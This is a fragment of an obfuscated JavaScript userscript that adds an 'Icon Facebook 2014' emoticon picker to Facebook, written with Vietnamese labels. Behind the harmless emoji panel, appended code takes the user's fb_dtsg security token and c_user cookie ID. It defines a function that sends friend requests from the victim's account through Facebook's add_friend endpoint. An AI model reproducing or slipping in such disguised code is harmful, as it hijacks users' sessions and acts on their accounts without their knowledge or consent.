        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ew',
        "\x6E\x61\x6D\x65": 'Ho\xE0ng t\u1EED ba t\u01B0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC83 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ex',
        "\x6E\x61\x6D\x65": 'Con ch\xFAa ba l\u0103m'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC85 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ey',
        "\x6E\x61\x6D\x65": 'S\u01A1n m\xF3ng tay ph\xE1t'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC8B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ez',
        "\x6E\x61\x6D\x65": 'Y\xEAu mi\u1EBFng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC8F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e-',
        "\x6E\x61\x6D\x65": 'B\u1ECDn m\xECnh h\xF4n cmn nhau \u0111\xEA'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC90 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e_',
        "\x6E\x61\x6D\x65": 'Hoa h\xF2e'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC91 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f0',
        "\x6E\x61\x6D\x65": 'B\u1ECDn m\xECnh trao tim cmn cho nhau \u0111\xEA'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC93 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f1',
        "\x6E\x61\x6D\x65": 'C\u1ED1 b\u1EAFt Wifi tr\xE1i tim em m\u1EDBi \u0111\u01B0\u1EE3c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC94 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f2',
        "\x6E\x61\x6D\x65": 'Tim t\xF4i v\u1EE1 cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC96 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f3',
        "\x6E\x61\x6D\x65": 'Tim t\xF4i tan ch\u1EA3y cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC97 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f4',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 1'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC98 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f5',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 2'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC99 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f6',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC9A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f7',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 4'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC9B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f8',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 5'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC9C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f9',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim 6'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC9D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fa',
        "\x6E\x61\x6D\x65": 'Ch\xF3i cm tim th\xEDm l\u1EA1i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA2 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fb',
        "\x6E\x61\x6D\x65": 'M\u1EA1ng nh\u1EC7n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA4 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fc',
        "\x6E\x61\x6D\x65": 'Ng\u1EE7 th\xF4i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA6 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fd',
        "\x6E\x61\x6D\x65": 'Phun'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA8 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fe',
        "\x6E\x61\x6D\x65": 'Gi\xF3 th\u1ED5i vi vu'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCA9 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ff',
        "\x6E\x61\x6D\x65": 'Shit'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCAA ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fg',
        "\x6E\x61\x6D\x65": 'C\u1EE9ng th\u1EBF n\xE0y \u01B0ng kh\xF4ng?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCBB ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fh',
        "\x6E\x61\x6D\x65": 'M\xE1y t\xEDnh m\u1EDBi t\u1EADu'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCBD ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fi',
        "\x6E\x61\x6D\x65": 'CD nh\u1EA1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCBE ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fj',
        "\x6E\x61\x6D\x65": '\u1ED4n c\u1EE9ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCBF ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fk',
        "\x6E\x61\x6D\x65": '\u0110ia tr\u1EAFng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCC0 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fl',
        "\x6E\x61\x6D\x65": 'DVD'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCDE ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fm',
        "\x6E\x61\x6D\x65": 'Anh nghe'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCE0 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fn',
        "\x6E\x61\x6D\x65": 'C\xF3 g\xEC c\u1EE9 g\u1EEDi Fax cho anh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCF1 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fo',
        "\x6E\x61\x6D\x65": 'Iphone 9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCF2 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fp',
        "\x6E\x61\x6D\x65": 'Iphone 9s'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDCFA ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fq',
        "\x6E\x61\x6D\x65": '\u0110ang xem TIVI'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDD14 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fr',
        "\x6E\x61\x6D\x65": 'Chu\xF4ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE01 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fs',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE02 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ft',
        "\x6E\x61\x6D\x65": 'Kh\xF3c cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE03 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fu',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE04 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fv',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 2'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE06 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fw',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE09 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fx',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 4'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE0B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fy',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 5'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE0C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2fz',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 6'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE0D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f-',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 7'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE0F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2f_',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 8'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE12 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g0',
        "\x6E\x61\x6D\x65": 'Ch\xE1n vl'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE13 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g1',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE14 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g2',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 10'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE16 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g3',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 11'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE18 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g4',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 12'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE1A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g5',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 13'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE1C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g6',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 14'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE1D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g7',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 15'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE1E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g8',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 16'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE20 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g9',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 17'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE21 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ga',
        "\x6E\x61\x6D\x65": 'M\u01A1 ka \u0111\u1EC1, ch\u1ECB n\xF3ng r\u1ED3i \u0111\u1EA5y nh\xE9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE22 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gb',
        "\x6E\x61\x6D\x65": 'Huhu...'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE23 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gc',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 18'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE24 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gd',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 19'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE25 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ge',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 20'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE28 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gf',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 21'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE29 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gg',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 22'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE2A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gh',
        "\x6E\x61\x6D\x65": 'Ng\u1EE7 cmnr nh\xE9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE2B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gi',
        "\x6E\x61\x6D\x65": 'H\xF4m nay m\u1EC7t vl'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE2D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gj',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 23'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE30 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gk',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 24'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE31 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gl',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 25'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE32 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gm',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 26'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE33 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gn',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 27'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE35 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2go',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 28'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE37 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gp',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 29'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE38 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gq',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 30'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE39 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gr',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 31'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gs',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 32'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gt',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 33'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gu',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 34'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gv',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 35'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE3F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gw',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 36'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE40 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gx',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 37'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE4B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gy',
        "\x6E\x61\x6D\x65": '\u0110\u1ED1 bi\u1EBFt tay tr\xE1i hay ph\u1EA3i?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE4C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2gz',
        "\x6E\x61\x6D\x65": 'Tay \u1EA3i tay ai?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE4D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g-',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 38'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDE4F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2g_',
        "\x6E\x61\x6D\x65": 'L\xEAn l\xE0 l\xEAn l\xEAn lu\xF4n'
    }, {
        "\x63\x68\x61\x72\x73": ' \u261D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h0',
        "\x6E\x61\x6D\x65": 'D\u1EB9p ra \u0111\u1EC3 anh l\xEAn'
    }, {
        "\x63\x68\x61\x72\x73": ' \u263A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h1',
        "\x6E\x61\x6D\x65": 'Bi\u1EC3u t\u01B0\u1EE3ng vui 39'
    }, {
        "\x63\x68\x61\x72\x73": ' \u26A1 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h2',
        "\x6E\x61\x6D\x65": 'B\u1ECB gi\u1EADt s\xE9t cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \u26C4 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h3',
        "\x6E\x61\x6D\x65": 'Ng\u01B0\u1EDDi tuy\u1EBFt, Sapa m\xF9a \u0111\xF4ng 2013'
    }, {
        "\x63\x68\x61\x72\x73": ' \u270A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h4',
        "\x6E\x61\x6D\x65": 'N\u0103m 2014 quy\u1EBFt t\xE2m c\xF3 G\u1EA4U'
    }, {
        "\x63\x68\x61\x72\x73": ' \u270B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h5',
        "\x6E\x61\x6D\x65": 'Tay ph\u1EA3i nh\xE9'
    }, {
        "\x63\x68\x61\x72\x73": ' \u270C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h6',
        "\x6E\x61\x6D\x65": '2, l\xE0m g\u1EA5u c\u1EE7a t\u1EDB nh\xE9?'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2600 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h7',
        "\x6E\x61\x6D\x65": 'N\u1EAFng l\xEAn r\u1ED3i'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2601 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h8',
        "\x6E\x61\x6D\x65": 'M\xE2y tr\xF4i'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2614 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2h9',
        "\x6E\x61\x6D\x65": 'Th\xF4i ch\u1EBFt, m\u01B0a cmnr, \xF4 \u0111\xE2u \xF4 \u0111\xE2u?'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2615 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ha',
        "\x6E\x61\x6D\x65": 'L\xE0m c\u1ED1c Cafe cho t\u1EC9nh t\xE1o, haizzz'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2728 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2hb',
        "\x6E\x61\x6D\x65": 'B\u1ECB hoa m\u1EAFt cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \u2764 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2hc',
        "\x6E\x61\x6D\x65": 'T\xF4i y\xEAu b\u1EA1n'
    }];
    var _0x3384x2 = document['activeElement'];
 
    function _0x3384x3(_0x3384x4) {
        var _0x3384x5 = document['createElement']('div');
        _0x3384x5['innerHTML'] = _0x3384x4;
        return _0x3384x5['firstChild'];
    };
 
    function _0x3384x6(_0x3384x7) {
        var _0x3384x8 = document['createElement']('div');
        var _0x3384x9 = document['createTextNode'](_0x3384x7);
        _0x3384x8['appendChild'](_0x3384x9);
        return _0x3384x8['innerHTML'];
    };
 
    function _0x3384xa(_0x3384xb) {
        return (_0x3384xb instanceof HTMLInputElement && _0x3384xb['type'] == 'text') || _0x3384xb instanceof HTMLTextAreaElement;
    };
 
    function _0x3384xc(_0x3384xd) {
        return _0x3384xd['className'] == 'openToggler';
    };
 
    function _0x3384xe(_0x3384xd, _0x3384xf) {
        if (_0x3384xf === undefined) {
            _0x3384xf = !_0x3384xc(_0x3384xd);
        };
        if (_0x3384xf) {
            _0x3384xd['className'] = 'openToggler';
        } else {
            _0x3384xd['removeAttribute']('class');
        };
    };
 
    function _0x3384x10(_0x3384x11, _0x3384x12) {
        var _0x3384x4;
        _0x3384x4 = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
        _0x3384x4 += '<div class="jewelFlyout">';
        _0x3384x4 += '</div>';
        _0x3384x4 += '</li>';
        var _0x3384x13 = _0x3384x3(_0x3384x4);
        _0x3384x11['appendChild'](_0x3384x13);
        _0x3384x4 = '<div style="display: none;">';
        _0x3384x4 += '</div>';
        var _0x3384x14 = _0x3384x3(_0x3384x4);
        _0x3384x12['appendChild'](_0x3384x14);
        (function (_0x3384x14) {
            _0x3384x13['addEventListener']('click', function () {
                var _0x3384x15 = this['parentNode']['childNodes'];
                for (var _0x3384x16 = 0; _0x3384x16 < _0x3384x15['length']; _0x3384x16++) {
                    if (_0x3384x15[_0x3384x16] === this) {} else {
                        _0x3384x15[_0x3384x16]['style']['background'] = '';
                        _0x3384x15[_0x3384x16]['firstChild']['style']['color'] = '';
                    };
                };
                var _0x3384x17 = _0x3384x14['parentNode']['childNodes'];
                for (var _0x3384x18 = 0; _0x3384x18 < _0x3384x17['length']; _0x3384x18++) {
                    if (_0x3384x17[_0x3384x18] === _0x3384x14) {
                        _0x3384x14['style']['display'] = '';
                    } else {
                        _0x3384x17[_0x3384x18]['style']['display'] = 'none';
                    };
                };
            });
        })(_0x3384x14);
        return {
            "\x74\x69\x74\x6C\x65": _0x3384x13['firstChild'],
            "\x62\x6F\x64\x79": _0x3384x14
        };
    };
 
    function _0x3384x19(_0x3384x1, _0x3384x1a) {
        var _0x3384x4;
        _0x3384x4 = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
        _0x3384x4 += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
        _0x3384x4 += '</div>';
        _0x3384x4 += '</div>';
        var _0x3384x14 = _0x3384x3(_0x3384x4)['firstChild'];
        for (var _0x3384x1b = 0; _0x3384x1b < _0x3384x1['length']; _0x3384x1b++) {
            var _0x3384x1c = _0x3384x1[_0x3384x1b];
            if (!_0x3384x1a(_0x3384x1c)) {
                continue;
            };
            _0x3384x4 = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
            _0x3384x4 += '<a';
            _0x3384x4 += ' class="emoticon' + (_0x3384x1c['class'] !== undefined ? ' ' + _0x3384x1c['class'] : '') + '"';
            _0x3384x4 += ' style="text-decoration: inherit; color: inherit;' + (_0x3384x1c['class'] !== undefined ? ' color: transparent;' : ' width: auto;') + '"';
            _0x3384x4 += (_0x3384x1c['name'] !== undefined ? ' title="' + _0x3384x1c['name'] + '"' : '');
            _0x3384x4 += '>';
            _0x3384x4 += _0x3384x6(_0x3384x1c['chars']);
            _0x3384x4 += '</a>';
            _0x3384x4 += '</span>';
            var _0x3384x1d = _0x3384x3(_0x3384x4);
            _0x3384x14['appendChild'](_0x3384x1d);
            var _0x3384x1e = _0x3384x1d['firstChild'];
            (function (_0x3384x1c) {
                _0x3384x1e['addEventListener']('click', function () {
                    if (_0x3384xa(_0x3384x2)) {
                        _0x3384x2['focus']();
                        var _0x3384x1f = _0x3384x1c['chars'];
                        var _0x3384x20 = _0x3384x2['value'];
                        var _0x3384x21 = _0x3384x2['selectionStart'];
                        var _0x3384x22 = _0x3384x2['selectionEnd'];
                        _0x3384x2['value'] = _0x3384x20['substring'](0, _0x3384x21) + _0x3384x1f + _0x3384x20['substring'](_0x3384x22);
                        _0x3384x2['setSelectionRange'](_0x3384x21 + _0x3384x1f['length'], _0x3384x21 + _0x3384x1f['length']);
                    };
                    openFlyoutCommand = false;
                });
            })(_0x3384x1c);
        };
        return _0x3384x14['parentNode'];
    };
    var _0x3384x4;
    _0x3384x4 = '<li class="navItem middleItem notifNegativeBase">';
    _0x3384x4 += '<div class="fbJewel">';
    _0x3384x4 += '<a class="navLink" title="Icon Facebook 2014">';
    _0x3384x4 += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img> Icon Facebook</span>';
    _0x3384x4 += '</a>';
    _0x3384x4 += '<div>';
    _0x3384x4 += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
    _0x3384x4 += '<div class="jewelBeeperHeader">';
    _0x3384x4 += '<div class="beeperNubWrapper">';
    _0x3384x4 += '<div class="beeperNub" style="left: 4px;"></div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '<ul style="display: text-align: center;">';
    _0x3384x4 += '</ul>';
    _0x3384x4 += '<div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '<div class="jewelFooter">';
    _0x3384x4 += '<a class="jewelFooter" href="https://www.facebook.com/01pevkut" target="_blank">Thiệu Smile</a>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</li>';
    var _0x3384x23 = _0x3384x3(_0x3384x4);
    var _0x3384x24 = document['querySelector']('#pageNav');
    _0x3384x24['insertBefore'](_0x3384x23, _0x3384x24['firstChild']);
    _0x3384x23['addEventListener']('click', function () {
        if (_0x3384xa(_0x3384x2)) {
            _0x3384x2['focus']();
        };
        openFlyoutCommand = undefined;
    }, true);
    var _0x3384x25 = _0x3384x23['firstChild']['firstChild'];
    var _0x3384xd = _0x3384x25['nextSibling'];
    var _0x3384x11 = _0x3384xd['firstChild']['childNodes'][1];
    var _0x3384x12 = _0x3384x11['nextSibling'];
    _0x3384x25['addEventListener']('click', function () {
        openFlyoutCommand = !_0x3384xc(_0x3384xd);
    });
    var _0x3384x26 = _0x3384x10(_0x3384x11, _0x3384x12);
    _0x3384x26['title']['click']();
    _0x3384x26['body']['appendChild'](_0x3384x19(_0x3384x1, function (_0x3384x1c) {
        if (_0x3384x1c['class'] === undefined) {
            return false;
        };
        if (_0x3384x1c['chars']['length'] == 2) {
            return false;
        };
        return true;
    }));
    document['addEventListener']('click', function () {
        _0x3384x2 = document['activeElement'];
        if (openFlyoutCommand !== undefined) {
            _0x3384xe(_0x3384xd, openFlyoutCommand);
        };
        openFlyoutCommand = false;
    });
})();
//11111CoderLike
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
